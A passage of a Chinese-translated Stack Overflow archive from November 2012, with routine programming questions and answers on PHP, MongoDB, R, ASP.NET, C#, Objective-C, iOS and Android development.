$iter->attachIterator( new ArrayIterator( $array['aN']));

foreach( $iter as $data) {
    list( $a, $b) = $data;
    echo $a['iId'] . ' ' . $b['sName'] . ',';
} 
```

您可以从[这个演示](http://3v4l.org/ovQte)中看到它打印出来（对于 PHP >= 5.3）：

```
0 a,1 b,2 v, 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:19:54.230

如果我猜对了，您想遍历“aM”，然后在“aN”中找到相应的项目。

```
$sets = array();
foreach ($arr['aM'] as $key => $item) {
    $sets[] = $item['iId'] . ' ' . $arr['aN'][$key]['sName'];
}
echo join(', ', $sets); 
```

# mongodb - mongodb 等效于 sql select 'longfield' as 'a'

> ID：13418336
> 
> 赞同：0
> 
> 时间：2012-11-16T14:14:29.770
> 
> 标签：mongodb

通过阅读MongoDB文档判断，没有类似sql语句的等价物

```
SELECT 'field1' as 'a', 'field2' as 'b' .... 
```

但因为我需要这样的功能，我希望我错过了一些东西。

处理这个问题的常见做法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T15:26:47.280

最常见的方法是在您的应用程序中创建一个映射层以获取一组字段，然后将它们映射到您的应用程序需要的内容。

您是正确的，MongoDB 中根本没有`AS`内置投影。

我相信你可以通过聚合来实现这一点：

*   我不明白为什么
*   它会比只在应用程序中进行更重和更慢。

所以是的，我会坚持在应用程序中编写一个映射类。

# r - 如何在 R 中使用变量标签？

> ID：13418338
> 
> 赞同：1
> 
> 时间：2012-11-16T14:14:30.493
> 
> 标签：r, ggplot2

我正在使用 ggplot2 生成散点图，我想使用变量标签作为 x 轴和 y 轴的标题。我该怎么做？谢谢。

x0, y0 是函数变量。假设 x0 有标签“labelx”，而 y0 有标签“labely”。代码是这样的，但是如何将标签用作 xtitle 和 ytitle？谢谢。

```
scatplot <- function(x0, y0){
  ggplot(data = test, aes(x = x0, y = y0)) + 
  geom_point() +
  geom_smooth(se = FALSE, method = "lm",  color = "blue", size = 1) +
  scale_x_continuous(xtitle) +
  scale_y_continuous(ytitle)
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:25:26.553

传递给函数的对象的名称`x`可以使用`deparse(substitute(x))`.

因此，您可以分别用和替换`xtitle`和。`ytitle``deparse(substitute(x0))``deparse(substitute(y0))`

# tfs - 在 TFS 2012 任务板中可视化被阻止的任务

> ID：13418340
> 
> 赞同：1
> 
> 时间：2012-11-16T14:14:34.907
> 
> 标签：tfs, tfs-2012

有没有人找到一种方法来可视化 TFS 2012 任务板上的任务何时被阻止？如果我能找到改变可视化（颜色等）的方法，那就太好了。我在 VS 板上看到了一些我投票赞成的请求，但希望有人可能找到了 hack =)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T20:57:03.963

您可以编写一个 tfs 2012 网络访问插件。Tiago Pascoal 写了一个很好的例子——Team [Foundation Task Board Enhancer——](http://pascoal.net/2012/09/team-foundation-task-board-enhancer-version-0-3-released)它在板上添加了许多东西（包括任务 ID）。一旦您可以确定任务是否被阻止，更改颜色应该非常容易。

# webview - 在 android 4.0 上运行 flash 文件，但只有声音伴随着白屏！

> ID：13418342
> 
> 赞同：0
> 
> 时间：2012-11-16T04:51:05.847
> 
> 标签：webview

我在 android 4.0 上运行 flash 文件时遇到问题，我使用了意图，但什么也没发生，现在我正在使用 web 视图运行，但只有声音来了，只有白屏显示。请帮我解决我的问题，我被困在这里，我遇到了大麻烦。下面是我使用的代码。

```
webView = (WebView)findViewById(R.id.webView);
    webView.getSettings().setJavaScriptEnabled(true);
    webView.getSettings().setAllowFileAccess(true);
    //webView.getSettings().setPluginsEnabled(true);
    webView.getSettings().setPluginState(WebSettings.PluginState.ON);

    String html = "<object width=\"550\" height=\"400\"> <param name=\"movie\" value=\"file:///sdcard/mainV7.swf\"> <embed src=\"file:///sdcard/mainV7.swf\" width=\"550\" height=\"400\"> </embed> </object>";
    String mimeType = "text/html";
    String encoding = "utf-8";

    webView.loadDataWithBaseURL("null", html, mimeType, encoding, ""); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-17T03:51:30.143

请检查此链接：[Android 的 Flash 支持](http://www.pcmag.com/article2/0,2817,2406507,00.asp)

还要检查您的设备是否支持闪存文件。

# objective-c - 如何使用 keywindow 无边框窗口（覆盖）覆盖全屏游戏？

> ID：13418343
> 
> 赞同：2
> 
> 时间：2012-11-16T14:14:48.303
> 
> 标签：objective-c, xcode, macos, cocoa

我创建了有时会显示带有标签和文本框的叠加层的应用程序。它工作得很好，但即使其他应用程序处于全屏模式并处于活动状态，我也需要它才能工作。

对于叠加，我创建了自定义窗口类和重写`canBecomeKeyWindow`方法，让无边框窗口成为关键窗口（只需返回`YES`）。

所以它可以工作，但是当我运行例如 Minecraft，然后使其全屏显示时，我的叠加层可以覆盖它。但我无法在叠加层中输入 NSTextField。如何解决？

我正在创建这样的叠加层：

```
[[NSWorkspace sharedWorkspace] hideOtherApplications];
NSRect frame = [[NSScreen mainScreen] frame];
_fadedWindow = [[CustonWindow alloc] initWithContentRect:frame
                                           styleMask:NSBorderlessWindowMask
                                             backing:NSBackingStoreBuffered
                                            defer:NO];
[_fadedWindow setAcceptsMouseMovedEvents:YES];
[_fadedWindow setOpaque:NO];
[_fadedWindow setLevel:CGShieldingWindowLevel()];
[_fadedWindow setBackgroundColor:[NSColor colorWithDeviceRed:0.0 green:0.0 blue:0.0 alpha:0.8]];
NSApplicationPresentationOptions options = NSApplicationPresentationDisableProcessSwitching + NSApplicationPresentationHideDock + NSApplicationPresentationDisableForceQuit + NSApplicationPresentationDisableSessionTermination + NSApplicationPresentationDisableHideApplication;
[NSApp setPresentationOptions:options];
_fadedWindow.alphaValue = 0;
[_fadedWindow orderFrontRegardless];
[[_fadedWindow animator] setAlphaValue:1];
[_fadedWindow toggleFullScreen:self];
[_fadedWindow makeKeyAndOrderFront:self];
[NSApp activateIgnoringOtherApps:YES];
[_fadedWindow orderFront:self]; 
```

但是，我似乎无法用键盘输入填充覆盖的 NSTextField 。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T03:24:56.757

试试这个。为 _fadedWindow 创建一个子类。然后把这个放进去：

```
-(BOOL)canBecomeKeyWindow {
    return YES;
} 
```

# .net - Web API 接口在本地工作，但在部署到 Azure 网站后得到 404

> ID：13418344
> 
> 赞同：21
> 
> 时间：2012-11-16T14:14:50.353
> 
> 标签：.net, asp.net-mvc-4, asp.net-web-api, http-status-code-404, azure-cloud-services

我正在开发一个 ASP.NET MVC 4 网站。连同 MVC 控制器，我有一个 API 控制器，其中包含一个 ajax GET API 接口。在使用 Visual Studio 进行本地调试时，它可以完美运行。

但是，在我将其部署为 Azure 网站后，MVC 控制器可以工作，但 API 控制器不再工作。当 jQuery 代码尝试访问它时，它会返回如下响应：

> 未找到与请求 URI“ [http://example.com](http://example.com) ”匹配的 HTTP 资源。

看起来至少该路由有效（否则，将返回另一个 404 响应正文。）。

此外，我将另一个纯 MVC 4 Web API 服务部署为 Azure 云服务。它完美地工作。因此，我想知道是什么导致 MVC 网站内的 API 失败？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-03-24T21:34:02.717

这是一个常见的问题当一个MVC应用程序部署在IIS上时，调用你的Web API暴露的REST服务的HTTP url会改变。如果您的 api 控制器名为 MyApiController，那么在生产环境中，您应该在调用 URL 之前添加应用程序名称。这意味着 /api/MyApi 将变为 /MyApp/api/MyApi。MyApp 是您网站的前缀 (yourwebsite/MyApp)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-03-12T04:25:37.550

我们通过基于属性的路由为控制器命名，并为控制器内的每个端点命名。按照惯例，出于安全原因，不允许使用通用的 GET、PUT、POST、PATCH。

网络安全和我们的 DevOps 需要它用于防火墙日志、性能监控和安全监控。

考虑使用：

```
 [Route("api/inventory")]
    public class InventoryController : ApiController
    {
      [HttpGet("inventorylist")]
      public IActionResult InventoryList() 
      { 
      }

      [HttpGet("inventoryitem")]
      public ActionResult InventoryItem([FromQuery] string itemId) 
      {
      }
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-06-27T18:11:30.127

我解决了这个问题。我使用 Telerik DataAccess 作为我的 ORM，项目应该必须`Copy Local`为**True**。

同样，如果它们似乎是第 3 方 dll 或来自 nuget ，则将所有引用添加为*Copy Local=True 。*

您可以通过在 Web.config 文件中添加`<customErrors mode="Off" />`内部来更轻松地找到错误。`<system.web>`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-17T03:15:20.683

检查他们通常有帮助的这些事情：

1.  确保您的控制器类型是公共的并且派生自 ApiController
2.  确保控制器名为“xxxxController”，其中 xxxx 是控制器名称

在这种情况下，URL api/xxxx 应该可以工作。

# c# - 如何获取 Datagridview Combobox 选定项的 TEXT？

> ID：13418354
> 
> 赞同：10
> 
> 时间：2012-11-16T14:15:24.587
> 
> 标签：c#, winforms, datagridview, combobox, selectedtext

如何获取DataGridView 内的 Combobox 选定项**文本？**我尝试使用以下代码：

```
dataGridView1.Rows[1].Cells[1].Value.ToString() 
```

但是，这给出了与此单元格关联的值，而不是 Combobox 选定项文本。我也试过这个：

```
DataGridViewComboBoxCell cell = dataGridView1[1,1] as DataGridViewComboBoxCell;
string value = cell.Value.ToString(); 
```

但是，这也无济于事。

我会很感激你的帮助。提前致谢！

**编辑：**

假设我们有一个组合框，其文本为`No`和`Yes`，值分别为 0 和 1。当 Combobox 更改时，我想在这里得到的是 text`Yes`或。`No`但我得到的是使用上述代码的值 0/1。希望这能让事情变得清楚。

**更新：**

好的，所以我一直在研究这个问题，经过大量的努力并在我的同事的帮助下，我已经能够解决这个问题并获得所需的解决方案：

这是解决方案：

```
string SelectedText = Convert.ToString(dataGridView1.Rows[0].Cells[1].FormattedValue.ToString()); 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-20T09:54:35.800

要在 DataGridView 中获取 Combobox 的选定值和选定文本，请尝试以下代码

```
string SelectedText = Convert.ToString((DataGridView1.Rows[0].Cells["dgcombocell"] as DataGridViewComboBoxCell).FormattedValue.ToString());
int SelectedVal = Convert.ToInt32(DataGridView1.Rows[0].Cells["dgcombocell"].Value); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-19T07:32:51.717

我设法以这种方式将该字符串值拉出单元格：

```
DataGridViewComboBoxCell dgvcmbcell = dataGridView1[1, 0] as DataGridViewComboBoxCell;
String text = dgvcmbcell.EditedFormattedValue.ToString(); 
```

解决这个问题的最简单方法是使用调试器并查看 dgvcmdcell 对象。在此您将找到可扩展节点“base”。展开它并浏览它，您会找到所需的任何信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-03-28T07:34:29.340

也试试这个：

```
DataGridView.CurrentRow.Cells(Column.name).EditedFormattedValue.ToString() 
```

`EditedFormattedValue`对象给出单元格的当前格式化值`DataGridView`，无论单元格是否被编辑或处于编辑模式。`ComboBox`捕获选择或单元格中的任何值更方便`DataGridView`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T22:53:45.987

要访问 datagridview 中当前选定的文本，您需要对 Combobox 列的[CurrencyManager的引用。](http://msdn.microsoft.com/en-us/library/system.windows.forms.currencymanager.aspx)[CurrencyManager](http://msdn.microsoft.com/en-us/library/system.windows.forms.currencymanager.aspx)与金钱无关，而是管理列与其数据源之间的绑定。[CurrencyManager](http://msdn.microsoft.com/en-us/library/system.windows.forms.currencymanager.aspx)可以告诉您**当前**选择的组合框是什么。

**代码：**

```
 CurrencyManager cm = (CurrencyManager)DataGridView1.BindingContext[((System.Windows.Forms.DataGridViewComboBoxColumn)DataGridView1.Columns[0]).DataSource]; 
```

**注意：**没有必要将该列转换为组合框，我只是为了向您展示我传入的列。我使用索引 0 但使用任何索引是组合框列的实际索引。

现在使用货币管理器，您可以访问该列的数据网格的当前选择（因为那是您传入的列）。

```
 cm.Current; //returns the current selection whatever that is 
```

所以在我的情况下，组合框列的数据源是一个名为 Choice 的类，选择如下所示：

```
 public class Choice
    {
            public string Text
            {
                get;
                set;
            }
    } 
```

当我访问 cm.Current 属性时，它将返回选择类的一个实例，我现在可以访问我的选择类的**Text**属性以查看选择了哪个值。您显然必须根据您的特定情况进行调整。我希望这有帮助。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-16T14:59:31.010

你可以试试这个：-

```
dataGridView1.CurrentRow.Cells[0].Value.ToString(); 
```

索引您需要查看的单元格的列，以您的`ComboBoxColumn`.

# google-drive-api - 用于设备身份验证的 vb.net Google api 简单的 http post 请求失败

> ID：13418355
> 
> 赞同：1
> 
> 时间：2012-11-16T14:15:25.530
> 
> 标签：google-drive-api, google-authentication, google-api-dotnet-client

我正在创建一个谷歌驱动设备应用程序。我正在尝试阅读本教程： [https ://developers.google.com/accounts/docs/OAuth2ForDevices](https://developers.google.com/accounts/docs/OAuth2ForDevices)

我第一时间就有货了 简单的 POST 步骤

这返回 400 错误请求：

```
 Try

        Dim request As HttpWebRequest
        Dim response As HttpWebResponse = Nothing
        Dim reader As StreamReader
        Dim data As StringBuilder
        Dim byteData() As Byte
        Dim postStream As Stream = Nothing
        request = DirectCast(WebRequest.Create("https://accounts.google.com/o/oauth2/device/code"), HttpWebRequest)
        request.Method = "POST"
        request.ContentType = "application/x-www-form-urlencoded"
        data = New StringBuilder()
        data.Append("client_id=XXXXXXXXXXX.apps.googleusercontent.com&")
        data.Append("scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fdrive")
        byteData = UTF8Encoding.UTF8.GetBytes(data.ToString())
        request.ContentLength = byteData.Length
        Try
            postStream = request.GetRequestStream()
            postStream.Write(byteData, 0, byteData.Length)
        Finally
            If Not postStream Is Nothing Then postStream.Close()
        End Try

        Try
            ' Get response  
            response = DirectCast(request.GetResponse(), HttpWebResponse)

            ' Get the response stream into a reader  
            reader = New StreamReader(response.GetResponseStream())

            ' Console application output  
            tb1.Text = reader.ReadToEnd()
        Finally
            If Not response Is Nothing Then response.Close()
        End Try

    Catch ex As Exception
        tb1.Text = ex.Message
    End Try 
```

我缺少发布信息吗？是 httpwebrequest 不是正确的工具吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:51:53.940

您不必编写自己的授权，您可以使用 .NET 客户端库。我们[这里有 c# 的示例](https://developers.google.com/drive/credentials)，您应该能够轻松地将它们转换为 VB.NET。

# asp.net - 将 GridView 设为静态宽度并强制水平滚动

> ID：13418359
> 
> 赞同：0
> 
> 时间：2012-11-16T14:15:30.593
> 
> 标签：asp.net, html, css

好的，所以我有一个 ASP.NET `GridView`，它当然会生成一个`table`. 这`table`是 a 的内部，`div`其静态宽度为`673px`。但是，我做什么似乎并不重要，我无法让它`table`保持在这些尺寸内并水平滚动。

这是带有内联样式的 HTML：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML Strict//EN">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <style>
        *
        {
            padding-top: 0px;
            padding-right: 0px;
            padding-bottom: 0px;
            padding-left: 0px;
            font-family: Arial, Helvetica, sans-serif;
            margin-top: 0px;
            margin-right: 0px;
            margin-bottom: 0px;
            margin-left: 0px;
        }
        html
        {
            color: #000;
            font-size: 12px;
            border-top-color: currentColor;
            border-right-color: currentColor;
            border-bottom-color: currentColor;
            border-left-color: currentColor;
            border-top-width: 0px;
            border-right-width: 0px;
            border-bottom-width: 0px;
            border-left-width: 0px;
            border-top-style: none;
            border-right-style: none;
            border-bottom-style: none;
            border-left-style: none;
        }
        body
        {
            background-color: rgb(237, 237, 237);
        }
        a
        {
            color: #154995;
            text-decoration: none;
        }
        .d-outer
        {
            width: 958px;
            text-align: left;
            margin-top: 0px;
            margin-right: auto;
            margin-bottom: 0px;
            margin-left: auto;
        }
        .d-inner
        {
            width: 958px;
            padding-top: 0px;
            padding-right: 0px;
            padding-bottom: 0px;
            padding-left: 0px;
            float: left;
            background-image: url("../images/base/inner_bg.gif");
            background-attachment: scroll;
            background-repeat: repeat-y;
            background-position-x: left;
            background-position-y: top;
            background-size: auto;
            background-origin: padding-box;
            background-clip: border-box;
            background-color: transparent;
        }
        .d-innerCont
        {
            width: 908px;
            padding-top: 10px;
            padding-right: 25px;
            padding-bottom: 15px;
            padding-left: 25px;
            float: left;
        }
        .d-main
        {
            width: 908px;
            padding-top: 0px;
            padding-right: 0px;
            padding-bottom: 0px;
            padding-left: 0px;
            float: left;
        }
        .d-left
        {
            width: 665px;
            padding-top: 0px;
            padding-right: 23px;
            padding-bottom: 0px;
            padding-left: 10px;
            float: left;
        }
        .gridViewStyle
        {
            width: 630px;
            overflow: scroll;
        }
        .gridViewStyle th, .gridViewStyle td
        {
            padding-top: 5px;
            padding-right: 5px;
            padding-bottom: 5px;
            padding-left: 5px;
        }
        .d-dataGridCont
        {
            width: 665px;
            padding-top: 0px;
            float: left;
        }
        .d-dataGridBody
        {
            width: 665px;
            padding-top: 0px;
            padding-right: 0px;
            padding-bottom: 0px;
            padding-left: 0px;
            float: left;
            background-image: url("../images/base/data_grid_bg.gif");
            background-attachment: scroll;
            background-repeat: repeat-y;
            background-position-x: left;
            background-position-y: top;
            background-size: auto;
            background-origin: padding-box;
            background-clip: border-box;
            background-color: transparent;
        }
        .d-dataGridBodyRow
        {
            width: 637px;
            padding-top: 0px;
            padding-right: 14px;
            padding-bottom: 0px;
            padding-left: 14px;
            float: left;
        }
    </style>
</head>
<body>
    <form name="aspnetForm" id="aspnetForm" onsubmit="javascript:return WebForm_OnSubmit();"
    method="post">
    <div class="d-outer">
        <div class="d-inner">
            <div class="d-innerCont">
                <div class="d-main">
                    <div class="d-left">
                        <div class="d-dataGridCont">
                            <div class="d-dataGridBody">
                                <div class="d-dataGridBodyRow">
                                    <div id="ctl00_formContent_PaymentsDiv">
                                        <div>
                                            <table class="gridViewStyle" id="ctl00_formContent_grdPayments" style="width: 95%;
                                                color: #333333; font-family: Lato; border-top-color: #c8c8c8; border-right-color: #c8c8c8;
                                                border-bottom-color: #c8c8c8; border-left-color: #c8c8c8; border-top-width: 2px;
                                                border-right-width: 2px; border-bottom-width: 2px; border-left-width: 2px; border-top-style: solid;
                                                border-right-style: solid; border-bottom-style: solid; border-left-style: solid;
                                                border-collapse: collapse;" border="0" cellspacing="0">
                                                <tbody style="">
                                                    <tr align="center" style="color: white; background-color: rgb(36, 97, 191);">
                                                        <td colspan="6">
                                                            <table border="0">
                                                                <tbody>
                                                                    <tr>
                                                                        <td>
                                                                            <span>1</span>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$2')">
                                                                                2</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$3')">
                                                                                3</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$4')">
                                                                                4</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$5')">
                                                                                5</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$6')">
                                                                                6</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$7')">
                                                                                7</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$8')">
                                                                                8</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$9')">
                                                                                9</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$10')">
                                                                                10</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$11')">
                                                                                ...</a>
                                                                        </td>
                                                                    </tr>
                                                                </tbody>
                                                            </table>
                                                        </td>
                                                    </tr>
                                                    <tr style="color: #333333; font-size: 18px; font-weight: bold; white-space: nowrap;
                                                        background-color: white;">
                                                        <th scope="col">
                                                            Issued Date
                                                        </th>
                                                        <th scope="col">
                                                            Customer
                                                        </th>
                                                        <th scope="col">
                                                            Vehicle Type
                                                        </th>
                                                        <th scope="col">
                                                            Claim #
                                                        </th>
                                                        <th scope="col">
                                                            Amount
                                                        </th>
                                                        <th scope="col">
                                                            Status
                                                        </th>
                                                    </tr>
                                                    <tr style="font-family: Lato; font-size: 16px; white-space: nowrap; background-color: rgb(226, 237, 243);">
                                                        <td>
                                                            2012/11/12
                                                        </td>
                                                        <td>
                                                            Bob's Repair
                                                        </td>
                                                        <td>
                                                            1999 Chevrolet Lumina
                                                        </td>
                                                        <td>
                                                            4687426946874269
                                                        </td>
                                                        <td align="right">
                                                            $409,714.00
                                                        </td>
                                                        <td>
                                                            ISSUED
                                                        </td>
                                                    </tr>
                                                    <tr align="center" style="color: white; background-color: rgb(36, 97, 191);">
                                                        <td colspan="6">
                                                            <table border="0">
                                                                <tbody>
                                                                    <tr>
                                                                        <td>
                                                                            <span>1</span>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$2')">
                                                                                2</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$3')">
                                                                                3</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$4')">
                                                                                4</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$5')">
                                                                                5</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$6')">
                                                                                6</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$7')">
                                                                                7</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$8')">
                                                                                8</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$9')">
                                                                                9</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$10')">
                                                                                10</a>
                                                                        </td>
                                                                        <td>
                                                                            <a style="color: white;" href="javascript:__doPostBack('ctl00$formContent$grdPayments','Page$11')">
                                                                                ...</a>
                                                                        </td>
                                                                    </tr>
                                                                </tbody>
                                                            </table>
                                                        </td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </form>
</body>
</html> 
```

***我最终需要得到的是`table`遵守其容器的静态宽度并水平滚动标题和行数据。***

我感谢大家的时间！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:25:57.363

放溢出：自动；在 .d-dataGridBody

```
 .d-dataGridBody
        {
            width: 665px;
            padding-top: 0px;
            padding-right: 0px;
            padding-bottom: 0px;
            padding-left: 0px;
            float: left;
            background-image: url("../images/base/data_grid_bg.gif");
            background-attachment: scroll;
            background-repeat: repeat-y;
            background-position-x: left;
            background-position-y: top;
            background-size: auto;
            background-origin: padding-box;
            background-clip: border-box;
            background-color: transparent;
            overflow:auto;
        } 
```

# c# - 什么时候应该在不可变结构上实现 GetHashCode？

> ID：13418360
> 
> 赞同：2
> 
> 时间：2012-11-16T14:15:40.330
> 
> 标签：c#

我在这里阅读了一些与`GetHashCode`正确实施有关的问题。我没有发现什么*时候*应该实现这个方法。

在我的具体情况下，我构建了一个简单的不可变结构：

```
public struct MyStruct
{
    private readonly Guid m_X;
    private readonly string m_Y;
    private readonly string m_Z;

    public Guid string X
    {
        get { return m_X; }
    }

    public string Y
    {
        get { return m_Y; }
    }

    public string Z
    {
        get { return m_Z; }
    }

    public MyStruct(Guid x, string y, string z)
    {
        if (x == Guid.Empty) throw new ArgumentException("x cannot be equals to Guid.Empty", "x");
        if (string.IsNullOrEmpty(y)) throw new ArgumentException("y cannot be null or empty", "y");
        if (string.IsNullOrEmpty(Z)) throw new ArgumentException("Z cannot be null or empty", "Z");

        this.m_X = x;
        this.m_Y = y;
        this.m_Z = Z;
    }

    public override int GetHashCode()
    {
        var x = 17;

        x = x * 23 + m_X.GetHashCode();
        x = x * 23 + m_Y.GetHashCode();
        x = x * 23 + m_Z.GetHashCode();

        return x;
    }
} 
```

在这种情况下，我已经实施`GetHashCode`了，但它是强制性的吗？`object.GetHashCode`基本实现本身不是在处理这种情况吗？

**[编辑]**一些背景知识：我有一些字符串要解析和生成。此字符串是第 3 方自定义查询语言的一部分。字符串始终采用`X|Y|Z`. 我想`string.Split`通过提供这个自定义结构来避免开发人员使用和字符串连接。最后，该结构将包含这两个补充方法：

```
 public override string ToString()
    {
        return m_X.ToString() + "|" + m_Y + "|" + m_Z;
    }

    public static MyString Parse(string stringToParse)
    {
         // implementation omitted
    } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-16T14:16:45.910

> 基础 object.GetHashCode 实现本身不是在处理这种情况吗？

不，`ValueType.GetHashCode()`实际上是在处理它——默认实现做得非常糟糕，在大多数情况下只使用第一个字段。（在这种情况下，我不确定它会做什么，因为由于字符串引用，您的结构不是“blittable”。不能仅从字段中的简单二进制值检查相等性 - 字符串需要要检查是否相等。）

对于要用于相等操作的任何值类型（例如，作为字典中的键），重写`GetHashCode`and`Equals(object)`以及实现`IEquatable<T>`相等性检查不需要装箱是一个好主意。

在不覆盖的情况下覆盖*绝对*是一个坏主意- 我很惊讶编译器没有警告你。`GetHashCode``Equals`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:19:29.203

> 我什么时候应该实现这个方法

考虑到它`GetHashCode`基本上用于比较覆盖，当您必须实现自己的比较逻辑时必须使用它。

也可能是这样的情况，当您要定义结构的不完全相等（从它们的内容的角度来看）实例的*相似性时。*（也可以很自然地定义为自定义比较逻辑）

它**可能**在像`Keys`内部字典/哈希一样使用的类中创建。

> 可能用作哈希表中键的类也必须重写此方法，因为在哈希表中用作键的对象需要通过此方法生成自己的哈希码

# ios - 在 iOS 设备上存储应用程序信息

> ID：13418363
> 
> 赞同：-1
> 
> 时间：2012-11-16T14:15:50.570
> 
> 标签：ios, cocoa, uikit

**问题：** 应用程序应将应用程序特定信息（无论是什么信息，例如在 AppStore 中购买的对象，或者用户可以使用某些元素）存储到用户 iOS 设备中，并且此信息应在其他用户设备之间同步。

**问题：**我应该如何以及在哪里存储这些信息？

请，如果你有一些空闲时间，我想得到一个广泛的答案。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:20:58.153

我使用 Sqlite3 将信息存储在设备中，并使用公共信息源与其他设备同步，该信息源是 AWS（Amazon Web 服务）上 EC2 实例中的 Web 服务器，Web 服务暴露给设备。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-20T09:39:31.700

> 信息应在其他用户设备之间同步

如果需要同步的设备属于同一个人，那么这*正是*iCloud 的用例。您可以通过多种方式使用 iCloud，具体取决于数据的性质：在[Apple 的 iCloud 文档](http://developer.apple.com/library/ios/#documentation/FileManagement/Conceptual/FileSystemProgrammingGUide/iCloud/iCloud.html)中了解相关信息。

如果设备属于几个不同的人，您将不得不推出自己的同步策略并提供任何所需的服务器基础设施。直接的方法是在服务器上维护一个数据库以跟踪更改。您可以使用推送通知将更新通知每个设备，或让设备定期签入。

# php - 匹配模式并用 PHP 中的计数替换

> ID：13418364
> 
> 赞同：1
> 
> 时间：2012-11-16T14:15:51.160
> 
> 标签：php, preg-replace, preg-match

我将如何获取模式匹配的计数，然后用计数替换模式。

我试图匹配的所有模式都是字符串中的 bbcode 样式标签。

例如：这是一段 [blue]text[/blue]，其中所有单词都是 [blue]color[/blue]。

我需要用数字和其他文本替换每个标签，例如 [@@1@@] 和 [@@2@@]

我知道我可以将模式与 preg_match('/[blue](.*?)[/blue]/i',$string) 匹配，甚至替换 preg_replace

但是我怎样才能使用这些函数中的任何一个来获得计数，然后用它的计数位置替换匹配呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T15:45:35.223

尝试 preg_replace_callback：

```
$result = preg_replace_callback('/(\[blue\])([\[]*)(\[\/blue\])/i', function ($matches) {
    static $incr = 0;
    ++$incr;
    return '[@@'.$incr.'@@]'.$matches[2].'[@@'.$incr.'@@]';
}, $text); 
```

有关详细信息，请参阅[手册](http://php.net/manual/en/function.preg-replace-callback.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:21:34.477

您可以使用 $matches 参数。

```
int preg_match ( string $pattern , string $subject [, array &$matches [, int $flags = 0 [, int $offset = 0 ]]] ) 
```

如果你通过`$matches`它将返回一个包含所有结果的数组。用于`count($matches)`返回计数！

编辑：获得 $matches 数组后，您可以使用数组的键作为计数值来替换它们。

```
foreach($matches as $k=>$mat){
preg_replace ( /*same pattern*/,"[@@".$k."@@]", /* same subject */,1); //fourth param is to replace only one!
} 
```

尝试这个！

EDIT2：正确的是 preg_replace 不是 preg_match （在我的编辑中）。

# android - 在 Android 中“经济地”使用服务和广播接收器

> ID：13418371
> 
> 赞同：0
> 
> 时间：2012-11-16T14:16:14.000
> 
